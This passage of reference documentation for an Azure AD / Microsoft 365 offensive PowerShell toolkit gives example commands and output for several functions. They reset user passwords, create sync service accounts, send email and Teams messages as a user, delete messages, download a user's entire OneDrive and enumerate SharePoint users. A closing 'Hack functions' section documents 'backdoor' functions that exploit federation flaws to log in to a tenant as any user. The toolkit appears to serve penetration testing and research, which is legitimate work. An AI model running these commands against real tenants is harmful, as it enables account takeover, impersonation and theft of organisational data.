CloudAnchor            : User_d14f7322-c997-4e87-912b-f43c906cec81
ErrorDetails           : ErrorDetails
ObjectType             : User
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : ABC
SyncOperation          : Add
```

### Remove-AADIntAzureADObject (A)
This function removes an AAD object.

**Example:**
{{< highlight powershell >}}
# Remove AAD object
Remove-AADIntAzureADObject -sourceAnchor ABC
{{< /highlight>}}

**Output:**
```
CloudAnchor            : User_d14f7322-c997-4e87-912b-f43c906cec81
ErrorDetails           : ErrorDetails
ObjectType             : User
ResultCode             : Success
ResultErrorCode        : 0
ResultErrorDescription : ResultErrorDescription
SourceAnchor           : ABC
SyncOperation          : Add
```

### Set-AADIntUserPassword (A)
This function sets the user's password. Also the last change time can be set, must be before the current time.

**Example:**
{{< highlight powershell >}}
# Set the password and the change date to 1/1/1970
Set-AADIntUserPassword -SourceAnchor qIMPTm2Q3kimHgg4KQyveA== -Password "a" -ChangeDate 1/1/1970
{{< /highlight>}}

**Output:** (Result 0 = success)
```
CloudAnchor Result SourceAnchor            
----------- ------ ------------            
CloudAnchor 0      qIMPTm2Q3kimHgg4KQyveA==
```

**Example:**
{{< highlight powershell >}}
# Set the password and the change date to 1/1/1970
Set-AADIntUserPassword -CloudAnchor "User_60f87269-f258-4473-8cca-267b50110e7a" -Password "a" -ChangeDate 1/1/1970
{{< /highlight>}}

**Output:** (Result 0 = success)
```
CloudAnchor                               Result SourceAnchor            
-----------                               ------ ------------            
User_60f87269-f258-4473-8cca-267b50110e7a 0      SourceAnchor
```

### Reset-AADIntServiceAccount (A)
This function creates a new service account (or reset the password for existing one). The created user will have **DirectorySynchronizationAccount** role.

Azure AD Connect uses this during the configuration stage to create the service account and stores the username and password to the configuration database.

**Example:**
{{< highlight powershell >}}
# Create a new service account for AD sync
Reset-AADIntServiceAccount -ServiceAccount Sync_MyServer_nnnnnnn
{{< /highlight>}}

**Output:**
```
Password         UserName                                          
--------         --------                                          
5(]lCy=Q{.#@lb}p Sync_MyServer_nnnnnnn@company.onmicrosoft.com
```
## Exchange Online functions
**Eachange Online functions** are used to manipulate devices and send mail using ActiveSync and Outlook APIs.
Functions marked with E uses Exchange Online access token.

### Get-AADIntEASAutoDiscover (*)
Since version 0.1.6 <br>
Returns endpoints for the given protocol for the given email address. If the email address is invalid (i.e. the user does not exists) this takes ages..

**Example:**
{{< highlight powershell >}}
# Get endpoint for EWS api
Get-AADIntEASAutoDiscover -Email "some.user@company.com" -Protocol Ews
{{< /highlight>}}

**Output:**
```
Protocol  Url                         
--------  ---                         
Substrate https://substrate.office.com
```

### Get-AADIntEASAutoDiscoverV1 (E)
Since version 0.1.6 <br>
Returns ActiveSync endpoint for the given user (credentials or access token).

**Example:**
{{< highlight powershell >}}
# Get credentials
$Cred=Get-Credential
# Get endpoint for ActiveSync
Get-AADIntEASAutoDiscoverV1 -Credentials $Cred
{{< /highlight>}}

**Output:**
```
https://outlook.office365.com/Microsoft-Server-ActiveSync
```

### Set-AADIntEASSettings (E)
Since version 0.1.6 <br>
Adds new or modifies existing ActiveSync device for the given user (credentials or access token). 
The added or modified device can be used to send emails with <a href="#send-aadinteasmessage-e">Send-AADIntEASMessage</a>

**Example:**
{{< highlight powershell >}}
# Get credentials
$Cred=Get-Credential
# Create a device
Set-AADIntEASSettings -Credentials $Cred -DeviceId android01234 -DeviceType Android -Model "Android 01234" -PhoneNumber "+1234567890"
{{< /highlight>}}

**Output:**
{{< highlight xml >}}
<Settings xmlns="Settings"><Status>1</Status><DeviceInformation><Status>1</Status></DeviceInformation></Settings>
{{< /highlight>}}

### Get-AADIntMobileDevices (E)
Since version 0.1.6 <br>
Gets mobile devices from Exchange Online.
Devices can be used to send emails with <a href="#send-aadinteasmessage-e">Send-AADIntEASMessage</a>

**Example:**
{{< highlight powershell >}}
# Get credentials
$Cred=Get-Credential
# Get Mobile Devices
Get-AADIntMobileDevices -Credentials $Cred | select DeviceId,DeviceType,ClientType,UserDisplayname
{{< /highlight>}}

**Output:**
```
DeviceId     DeviceType                 ClientType UserDisplayName                                                 
--------     ----------                 ---------- ---------------                                                 
430847304    TestActiveSyncConnectivity EAS        EURP189A002.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizat
android01234 Android                    EAS        EURP189A002.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizat
```

### Send-AADIntEASMessage (E)
Since version 0.1.6 <br>
Sends an email from the given user via ActiveSync using the given device.

**Example:**
{{< highlight powershell >}}
# Get credentials
$Cred=Get-Credential
# Send an email
Send-AADIntEASMessage -Credentials $Cred -DeviceId android01234 -DeviceType Android -Recipient "someone@company.com" -Subject "An email" -Message "<h2>This is a message!</h2>"
{{< /highlight>}}

**Output:**
```
WARNING: Message was not Base64 encoded, converting..
```

### Send-AADIntOutlookMessage (E)
Since version 0.1.6 <br>
Sends an email from the given user via Outlook API.

**Example:**
{{< highlight powershell >}}
# Get accesstoken
$At=Get-AADIntAccessTokenForEXO
# Create the email
Send-AADIntOutlookMessage -AccessToken $At -Recipient "someone@company.com" -Subject "An email" -Message "<h2>This is a message!</h2>"
{{< /highlight>}}

### Open-AADIntOWA (O)
Since version 0.6.2 <br>
Opens OWA in a browser control window as the given user.

**Example1:**
{{< highlight powershell >}}
# Get accesstoken
Get-AADIntAccessTokenForEXO -Resource "https://outlook.office.com" -SaveToCache

# Open OWA
Open-AADIntOWA
{{< /highlight>}}

**Example2:**
{{< highlight powershell >}}
# Get accesstoken
Get-AADIntAccessTokenForEXO -Resource "https://substrate.office.com" -SaveToCache

# Open OWA
Open-AADIntOWA -Mode Substrate
{{< /highlight>}}

## SharePoint Online functions
**Eachange Online functions** are used to retrieve information of users and groups of SharePoint sites.

### Get-AADIntSPOSiteUsers (S)
Since version 0.2.4 <br>
Returns users of the given site.  Only visitor (read-access) is needed :)

**Example:**
{{< highlight powershell >}}
# Get site users
$ah=Get-AADIntSPOAuthenticationHeader -Site https://company.sharepoint.com
Get-AADIntSPOSiteUsers -Site https://company.sharepoint.com -AuthHeader $ah
{{< /highlight>}}

**Output:**
```
IsSiteAdmin                    : True
Id                             : 17
LoginName                      : c:0t.c|tenant|a200e3ee-47d0-4b9b-99c6-554b85823042
PrincipalType                  : 4
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : 
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : 
NameIdIssuer                   : 
Title                          : SharePoint Service Administrator
Email                          : 

IsSiteAdmin                    : False
Id                             : 1073741823
LoginName                      : SHAREPOINT\system
PrincipalType                  : 1
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : 
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : S-1-0-0
NameIdIssuer                   : urn:offic€:idp:activedirectory
Title                          : System Account
Email                          : 

IsSiteAdmin                    : False
Id                             : 23
LoginName                      : i:0#.f|membership|user@company.com
PrincipalType                  : 1
IsEmailAuthenticationGuestUser : False
UserPrincipalName              : user@company.com
IsShareByEmailGuestUser        : False
IsHiddenInUI                   : False
NameId                         : 10030000b5466d52
NameIdIssuer                   : urn:federation:microsoftonline
Title                          : user
Email                          : user@company.com
```

### Get-AADIntSPOUserProperties (S)
Since version 0.2.4 <br>
Returns detailed information of the given user. Only visitor (read-access) is needed :)


**Note:** the user's name must be in SharePoint "LoginName" format as above.

**Example:**
{{< highlight powershell >}}
# Get site users
$ah=Get-AADIntSPOAuthenticationHeader -Site https://company.sharepoint.com
Get-AADIntSPOUserProperties -Site https://company.sharepoint.com -AuthHeader $ah -User "i:0#.f|membership|user@company.com"
{{< /highlight>}}

**Output:**
```
Updated                            : 2019-08-16T07:59:30Z
Author                             : 
AccountName                        : i:0#.f|membership|user@company.com
DirectReports                      : 
DisplayName                        : user
Email                              : user@company.com
ExtendedManagers                   : 
ExtendedReports                    : i:0#.f|membership|user@company.com
IsFollowed                         : False
Peers                              : 
PersonalUrl                        : https://company-my.sharepoint.com/personal/user_company_com/
PictureURL                         : 
UserUrl                            : https://company-my.sharepoint.com:443/Person.aspx?accountname=i:0#.f|membership|user@company.com
Title                              : 
UserProfile_GUID                   : f6b3014d-c4d7-4775-a37c-1e6f14fa98f9
SID                                : i:0h.f|membership|10030000a5566b50@live.com
ADGuid                             : System.Byte[]
FirstName                          : 
SPS-PhoneticFirstName              : 
LastName                           : 
SPS-PhoneticLastName               : 
PreferredName                      : user
SPS-PhoneticDisplayName            : 
WorkPhone                          : 
Department                         : 
SPS-Department                     : 
Manager                            : 
AboutMe                            : 
PersonalSpace                      : /personal/user_company_com/
UserName                           : user@company.com
QuickLinks                         : 
WebSite                            : 
PublicSiteRedirect                 : 
SPS-JobTitle                       : 
SPS-Dotted-line                    : 
SPS-Peers                          : 
SPS-Responsibility                 : 
SPS-SipAddress                     : user@company.com
SPS-MySiteUpgrade                  : 
SPS-ProxyAddresses                 : 
SPS-HireDate                       : 
SPS-DisplayOrder                   : 
SPS-ClaimID                        : user@company.com
SPS-ClaimProviderID                : membership
SPS-ResourceSID                    : 
SPS-ResourceAccountName            : 
SPS-MasterAccountName              : 
SPS-UserPrincipalName              : user@company.com
SPS-O15FirstRunExperience          : 
SPS-PersonalSiteInstantiationState : 2
SPS-DistinguishedName              : CN=abf7eff8-59a5-456f-a723-976f07b14420,OU=a200e3ee-47d0-4b9b-99c6-554b85823042,OU=Tenants,OU=MSO
                                     nline,DC=SPODS44818354,DC=msoprd,DC=msft,DC=net
SPS-SourceObjectDN                 : 
SPS-ClaimProviderType              : Forms
SPS-SavedAccountName               : SPODS44833354\$JUHIC0-TJJO02Q7PVM2
SPS-SavedSID                       : System.Byte[]
SPS-ObjectExists                   : 
SPS-PersonalSiteCapabilities       : 4
SPS-PersonalSiteFirstCreationTime  : 10/2/2017 5:50:10 PM
SPS-PersonalSiteLastCreationTime   : 10/2/2017 5:50:10 PM
SPS-PersonalSiteNumberOfRetries    : 1
SPS-PersonalSiteFirstCreationError : 
SPS-FeedIdentifier                 : 
WorkEmail                          : user@company.com
CellPhone                          : 
Fax                                : 
HomePhone                          : 
Office                             : 
SPS-Location                       : 
Assistant                          : 
SPS-PastProjects                   : 
SPS-Skills                         : 
SPS-School                         : 
SPS-Birthday                       : 
SPS-StatusNotes                    : 
SPS-Interests                      : 
SPS-HashTags                       : 
SPS-EmailOptin                     : 
SPS-PrivacyPeople                  : True
SPS-PrivacyActivity                : 4095
SPS-PictureTimestamp               : 
SPS-PicturePlaceholderState        : 
SPS-PictureExchangeSyncState       : 
SPS-TimeZone                       : 
OfficeGraphEnabled                 : 
SPS-UserType                       : 0
SPS-HideFromAddressLists           : False
SPS-RecipientTypeDetails           : 
DelveFlags                         : 
msOnline-ObjectId                  : abf7eff8-59a5-456f-a723-976f07b14420
SPS-PointPublishingUrl             : 
SPS-TenantInstanceId               : 
SPS-SharePointHomeExperienceState  : 
SPS-MultiGeoFlags                  : 
PreferredDataLocation              : 
```
### Get-AADIntSPOSiteGroups (S)
Since version 0.2.4 <br>
Returns groups of the given site.  Only visitor (read-access) is needed :)

**Example:**
{{< highlight powershell >}}
# Get site groups
$ah=Get-AADIntSPOAuthenticationHeader -Site https://company.sharepoint.com
Get-AADIntSPOSiteGroups -Site https://company.sharepoint.com -AuthHeader $ah
{{< /highlight>}}

**Output:**
```
AllowRequestToJoinLeave        : False
Id                             : 3
LoginName                      : Excel Services Viewers
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : Excel Services Viewers
OwnerTitle                     : System Account

AllowRequestToJoinLeave        : False
Id                             : 19
LoginName                      : SharePointHome OrgLinks Admins
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Admins
OwnerTitle                     : SharePointHome OrgLinks Admins

AllowRequestToJoinLeave        : False
Id                             : 20
LoginName                      : SharePointHome OrgLinks Editors
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Editors
OwnerTitle                     : SharePointHome OrgLinks Editors

AllowRequestToJoinLeave        : False
Id                             : 21
LoginName                      : SharePointHome OrgLinks Viewers
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : True
IsHiddenInUI                   : False
Description                    : 
Title                          : SharePointHome OrgLinks Viewers
OwnerTitle                     : SharePointHome OrgLinks Admins

AllowRequestToJoinLeave        : False
Id                             : 9
LoginName                      : Team Site Members
AllowMembersEditMembership     : True
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Members
OwnerTitle                     : Team Site Owners

AllowRequestToJoinLeave        : False
Id                             : 7
LoginName                      : Team Site Owners
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Owners
OwnerTitle                     : Team Site Owners

AllowRequestToJoinLeave        : False
Id                             : 8
LoginName                      : Team Site Visitors
AllowMembersEditMembership     : False
AutoAcceptRequestToJoinLeave   : False
PrincipalType                  : 8
OnlyAllowMembersViewMembership : False
IsHiddenInUI                   : False
Description                    : 
Title                          : Team Site Visitors
OwnerTitle                     : Team Site Owners
```

### Set-AADIntSPOSiteMembers (S)
Since version 0.7.2 <br>
Returns groups of the given site.  Only visitor (read-access) is needed :)

**Example:**
{{< highlight powershell >}}
# Add user to site
$auth=Get-AADIntSPOAuthenticationHeader -Site "https://company.sharepoint.com"
Set-AADIntSPOSiteMembers -Site "https://company.sharepoint.com" -AuthHeader $auth -SiteName CompanyWiki -UserPrincipalName "user@company.com"
{{< /highlight>}}

**Output:**
```
User user@company.com was added to group CompanyWiki!
```

## OneDrive for Business functions

**OneDrive functions** are used to download, send, and modify files using OneDrive for Business APIs.

### New-AADIntOneDriveSettings
Since version 0.2.7 <br>
Creates a new OneDriveSettings object used with other OneDrive for Business functions.

To create new settings using interactive authentication (promtps twice for both OfficeApps and OneDrive APIs):

**Example:**
{{< highlight powershell >}}
# Create a new OneDriveSettings object
$os = New-AADIntOneDriveSettings
{{< /highlight>}}

To create new settings using Kerberos tickets:

**Example:**
{{< highlight powershell >}}
# Create a Kerberos ticket
$kt=New-AADIntKerberosTicket -ADUserPrincipalName "user@company.com" -Password "mypassword"

# Create a new OneDriveSettings object using Kerberos ticket
$os = New-AADIntOneDriveSettings -KerberosTicket $kt
{{< /highlight>}}

### Get-AADIntOneDriveFiles (O)
Since version 0.2.7 <br>
Downloads user's OneDrive for Business files (all of them).

Besides downloading the files, the following information is returned per file.

Attribute | Description
--- | --- 
Path | The relative path of the file or folder
Size | Size in bytes
ETag | Resource id and the **next** version number of the file in format "{<guid>},<int>"
Created | The time when the file was created
Modified | The time when the file was modified
ResourceID | The unique id of the file or folder
MimeType | The mime type of the file
Url | The "pre-authenticated" url of the file
XORHash | Xor-hash value of the file

**Note!** If you only want to list the files and folders, use **-PrintOnly** switch. If sync is restricted to only the members of specific domain(s), use the **-DomainGuid** parameter.

To download user's OneDrive files, use the following commands:

**Example:**
{{< highlight powershell >}}
# Create a new OneDriveSettings object
$os = New-AADIntOneDriveSettings

# Download the contents of the OneDrive to the current folder    
Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table
{{< /highlight>}}

**Output:**
```
Path                              Size  Created            Modified           ResourceID                   
----                              ----  -------            --------           ----------                   
\RootFolder\Document1.docx        11032 2.12.2019 20.47.23 2.12.2019 20.48.46 5e7acf393a2e45f18c1ce6caa7...
\RootFolder\Book.xlsx             8388  2.12.2019 20.49.14 2.12.2019 20.50.14 b26c0a38d4d14b23b785576e29...
\RootFolder\Docs\Document1.docx   84567 9.12.2019 11.24.40 9.12.2019 12.17.50 d9d51e47b66c4805aff3a08763...
\RootFolder\Docs\Document2.docx   31145 7.12.2019 17.28.37 7.12.2019 17.28.37 972f9c317e1e468fb2b6080ac2...
```


### Send-AADIntOneDriveFile (O)
Since version 0.2.7 <br>
Sends a local file to user's OneDrive to a specific folder.

**Note!** To send file, you need ResourceId of the folder you are sending the file.

**Note!** If sync is restricted to only the members of specific domain(s), use the **-DomainGuid** parameter.

To send a file to user's OneDrive to Documents folder:

**Example:**
{{< highlight powershell >}}
# Create a new OneDriveSettings object
$os = New-AADIntOneDriveSettings

# List folders and their resource ids:
Get-AADIntOneDriveFiles -OneDriveSettings $os -PrintOnly -FoldersOnly | select Path,ResourceID
{{< /highlight>}}

```
Path                  ResourceID                      
----                  ----------                      
\RootFolder           1679e14635404542880e3885b4374c3f
\RootFolder\Documents a2a54a01b586480ebbddf04cfaa36191
\RootFolder\Sales     bd59baa485a2411e951234fe6cbd8c5d
```
{{< highlight powershell >}}
# Send the file to Documents folder
Send-AADIntOneDriveFile -OneDriveSettings $os -FileName .\Document.docx -FolderId "a2a54a01b586480ebbddf04cfaa36191"
{{< /highlight>}}

**Output:**
```
ResourceID                            : 32b66e08379d4c448e001e9659777c71
ETag                                  : "{32B66E08-379D-4C44-8E00-1E9659777C71},2"
DateModified                          : 2019-12-11T11:18:38.0000000Z
RelationshipName                      : Document.docx
ParentResourceID                      : a2a54a01b586480ebbddf04cfaa36191
fsshttpstate.xschema.storage.live.com : fsshttpstate.xschema.storage.live.com
DocumentStreams                       : DocumentStreams
WriteStatus                           : Success
```
If the file exists etc. you'll get following error or similar:
```
RelationshipName ParentResourceID                 WriteStatus      
---------------- ----------------                 -----------      
Document         a2a54a01b586480ebbddf04cfaa36191 ItemAlreadyExists
```

To update existing file, you also need to know the ETag:
**Example:**
{{< highlight powershell >}}
# Update the file to Documents folder
Send-AADIntOneDriveFile -OneDriveSettings $os -FileName .\Document.docx -FolderId "a2a54a01b586480ebbddf04cfaa36191" -ETag "{32B66E08-379D-4C44-8E00-1E9659777C71},2"
{{< /highlight>}}

**Output:**
```
ResourceID                            : 32b66e08379d4c448e001e9659777c71
ETag                                  : "{32B66E08-379D-4C44-8E00-1E9659777C71},3"
DateModified                          : 2019-14-11T12:08:55.0000000Z
RelationshipName                      : Document.docx
ParentResourceID                      : a2a54a01b586480ebbddf04cfaa36191
fsshttpstate.xschema.storage.live.com : fsshttpstate.xschema.storage.live.com
DocumentStreams                       : DocumentStreams
WriteStatus                           : Success
```

## Teams functions

**Teams functions** are used to send and delete Teams messages.

### Get-AADIntSkypeToken (T)
Since version 0.4.4 <br>
Gets SkypeToken used for authentication for certain Teams services.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Get Skype token and save to variable
$skypeToken = Get-AADIntSkypeToken
{{< /highlight>}}

### Set-AADIntTeamsAvailability (T)
Since version 0.4.4 <br>
Sets the availability status of the user to Available, Busy, DoNotDisturb, BeRightBack, or Away

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Set Teams availability status to Busy
Set-AADIntTeamsAvailability -Status Busy
{{< /highlight>}}

### Set-AADIntTeamsStatusMessage (T)
Since version 0.4.4 <br>
Sets the Teams status message status of the user.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Set Teams status message
Set-AADIntTeamsStatusMessage -Message "Out of office til noon"
{{< /highlight>}}

### Search-AADIntTeamsUser (T)
Since version 0.4.4 <br>
Searhes users with the given searchstring.

**Example:**
{{< highlight powershell >}}
# Get access token for teams (to outlook) and save to cache
Get-AADIntAccessTokenForTeams -Resource https://outlook.com -SaveToCache

# Search for users
Search-AADIntTeamsUser -SearchString "user" | Format-Table UserPrincipalName,DisplayName
{{< /highlight>}}

**Output:**
```
UserPrincipalName       DisplayName
-----------------       -----------
first.user@company.com  First User 
second.user@company.com Second User
```

### Send-AADIntTeamsMessage (T)
Since version 0.4.4 <br>
Sends a Teams message to given recipients.

**Example 1:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Send Teams message
Send-AADIntTeamsMessage -Recipients "user@company.com" -Message "Hi user!"
{{< /highlight>}}

**Output:**
```
Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
```

**Example 2:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Get the list of users' message threads
Get-AADIntTeamsMessages | Select Link
{{< /highlight>}}
```
Link
----
19:a84fdc0c-519c-4467-b2e6-323a48ce09af_4d40755a-020b-422b-b9cf-2f1f50602377@unq.gbl.spaces
19:a84fdc0c-519c-4467-b2e6-323a48ce09af_4d40755a-020b-422b-b9cf-2f1f50602377@unq.gbl.spaces
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2
```
{{< highlight powershell >}}
# Send Teams message
Send-AADIntTeamsMessage -Thread "19:292f1d53677d45ff9d61d333cb0b4853@thread.tacv2" -Message "Hi there!"
{{< /highlight>}}

**Output:**
```
Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
```

### Get-AADIntTeamsMessages (T)
Since version 0.4.4 <br>
Gets user's latest Teams messages.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Get Teams messages
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
{{< /highlight>}}

**Output:**
```
Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 <div><div>Hi User!</div></div>                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
```

### Set-AADIntTeamsMessageEmotion (T)
Since version 0.4.5 <br>
Sets emotion for the given Teams message (like, heart, laugh, surprised, sad, or angry).
Emotions are not automatically cleared, so multiple emotions per message can be set. To clear the emotion, use the -Clear switch.

**Example 1:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Get Teams messages
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
{{< /highlight>}}

**Output:**
```
Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 <div><div>Hi User!</div></div>                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
```

{{< highlight powershell >}}
# Like the "Hola User!" message
Set-AADIntTeamsMessageEmotion -MessageID 1602859223294 -Emotion like
{{< /highlight>}}

**Example 2:**
{{< highlight powershell >}}
# Unlike the "Hola User!" message by clearing the like emoticon:
Set-AADIntTeamsMessageEmotion -MessageID 1602859223294 -Emotion like -Clear
{{< /highlight>}}


### Remove-AADIntTeamsMessages (T)
Since version 0.4.4 <br>
Deletes given Teams messages.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Get Teams messages
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
{{< /highlight>}}

```
Id            Content                         DeletionTime  MessageType   Type          DisplayName 
--            -------                         ------------  -----------   ----          ----------- 
1602842299338                                 1602846853687 RichText/Html MessageUpdate Bad User
1602844861358                                 1602858789696 RichText/Html MessageUpdate Bad User
1602846167606                                 1602858792943 Text          MessageUpdate Bad User
1602846853687                                 1602858795517 Text          MessageUpdate Bad User
1602833251951                                 1602833251951 Text          MessageUpdate Bad User
1602833198442                                 1602833198442 Text          MessageUpdate Bad User
1602859223294 Hola User!                                    Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          NewMessage    Bad User
1602859423019 Hi User!                                      Text          MessageUpdate Bad User
1602859473083 <div><div>Hi User!</div></div>                RichText/Html NewMessage    Bad User
1602859484420 Hey User!                                     Text          NewMessage    Bad User
1602859528028 Hy User!                                      Text          NewMessage    Bad User
1602859484420 Hey User!                                     Text          MessageUpdate Bad User
1602859590916 Hi User!                                      Text          NewMessage    Bad User
```
{{< highlight powershell >}}
# Delete Teams messages
Remove-AADIntTeamsMessages -MessageIDs 1602859590916,1602859484420
{{< /highlight>}}

### Find-AADIntTeamsExternalUser (T)
Since version 0.6.7 <br>
Finds the given external Teams user.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Find the external user from Teams
Find-AADIntTeamsExternalUser -UserPrincipalName "JohnD@company.com"
{{< /highlight>}}

```
tenantId          : dcc7d7bf-e3f5-4778-b6e0-aa7207bdb033
isShortProfile    : False
accountEnabled    : True
featureSettings   : @{coExistenceMode=TeamsOnly}
userPrincipalName : johnd@company.com
givenName         : JohnD@company.com
surname           : 
email             : JohnD@company.com
displayName       : John Doe
type              : Federated
mri               : 8:orgid:84bdccdb-eaba-4545-9729-4eff71b76841
objectId          : fe401a12-879c-4e5b-8b51-03e1985fa62f
```

### Get-AADIntTeamsAvailability (T)
Since version 0.6.7 <br>
Shows the availability of the given user.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Find the external user from Teams
Find-AADIntTeamsExternalUser -UserPrincipalName "JohnD@company.com"
{{< /highlight>}}

```
tenantId          : dcc7d7bf-e3f5-4778-b6e0-aa7207bdb033
isShortProfile    : False
accountEnabled    : True
featureSettings   : @{coExistenceMode=TeamsOnly}
userPrincipalName : johnd@company.com
givenName         : JohnD@company.com
surname           : 
email             : JohnD@company.com
displayName       : John Doe
type              : Federated
mri               : 8:orgid:84bdccdb-eaba-4545-9729-4eff71b76841
objectId          : fe401a12-879c-4e5b-8b51-03e1985fa62f
```
{{< highlight powershell >}}
# Get user's availability
Get-AADIntTeamsAvailability -ObjectId "fe401a12-879c-4e5b-8b51-03e1985fa62f"
{{< /highlight>}}

```
sourceNetwork : Federated
capabilities  : {Audio, Video}
availability  : Away
activity      : Away
deviceType    : Desktop
```

### Get-AADIntTranslation (T)
Since version 0.6.7 <br>
Translate the given text to the given language using Teams internal API.

**Example:**
{{< highlight powershell >}}
# Get access token for teams and save to cache
Get-AADIntAccessTokenForTeams -SaveToCache

# Translate the Finnish text to English
Get-AADIntTranslation -Text "Terve Maailma!" -Language "en-US"
{{< /highlight>}}

```
Hello World!
```

## Hack functions: Identity Federation

### Set-AADIntDomainAuthentication (A)
Sets authentication method of the domain. Same functionality than **Set-MsolDomainAuthentication** cmdlet.

**Example:**
{{< highlight powershell >}}
# Set authentication method to managed
Set-AADIntDomainAuthentication -DomainName company.com -Authentication Managed
{{< /highlight>}}

### ConvertTo-AADIntBackdoor (A)
This function converts the given domain to "backdoor", which can be used to login to the tenant as any user. See <a href="#open-aadintoffice365portal">Open-AADIntOffice365Portal</a> to use the backdoor.

This exploits a <a href="/post/federation-vulnerability/" target="_blank">vulnerability I discovered in late 2017</a>.
Technically, domain authentication type is set to Federated and configured to trust to the specific certificate (any.sts) and issuer.
You can get a free domain from <a href="https://www.myo365.site/">www.myo365.site</a>.

**Example:**
{{< highlight powershell >}}
# Convert the domain to backdoor
ConvertTo-AADIntBackdoor -DomainName company.myo365.site
{{< /highlight>}}

**Output:**
```
IssuerUri               Domain              
---------               ------              
http://any.sts/B231A11F company.myo365.site
```

The backdoor can also be accessed at https://<a href="https://aadinternalsbackdoor.azurewebsites.net" target="_blank">aadinternalsbackdoor.azurewebsites.net</a>

### New-AADIntBackdoor (A)
Since version 0.1.6 <br>
This function creates a "backdoor" for the given domain name, which can be used to login to the tenant as any user. See <a href="#open-aadintoffice365portal">Open-AADIntOffice365Portal</a> to use the backdoor.

This exploits a vulnerability I discovered in late 2018 which allows setting the authentication method also for the unverified domains. Microsoft has not responded to emails regarding this "feature".
**NOTE!** Microsoft has fixed this during the spring 2020, so backdoors created with this function does not work anymore.

**Example:**
{{< highlight powershell >}}
# Create a new backdoor
New-AADIntBackdoor -DomainName microsoft.com
